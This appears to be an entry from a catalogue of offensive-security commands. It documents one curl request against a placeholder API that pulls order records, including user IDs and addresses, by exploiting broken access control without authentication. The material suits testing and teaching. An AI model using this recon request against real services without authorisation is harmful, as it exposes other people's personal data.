---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  curl -X GET "https://target-app.com/api/v1/orders/12345" -H "Content-Type:
  application/json" -v
tags:
  - api
  - recon
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:30:07.290Z'
verified: false
validated: true
submitted: true
---
# curl-get-orders

## Command

```bash
curl -X GET "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" -v
```

## Description

This command retrieves order information from an unprotected API endpoint using curl, exploiting broken access control to disclose sensitive data without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| URL | Target endpoint with order ID | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://target-app.com/api/v1/orders/12345" -H "Content-Type: application/json" | jq '.'
```

## Expected Output

JSON object with order details: {"id":12345,"user_id":67890,"items":[...],"address":"...","status":"pending"}. No auth errors indicate success.

## Related

- [[Related Procedure: Access-Order-Information-via-Unprotected-Endpoint]]
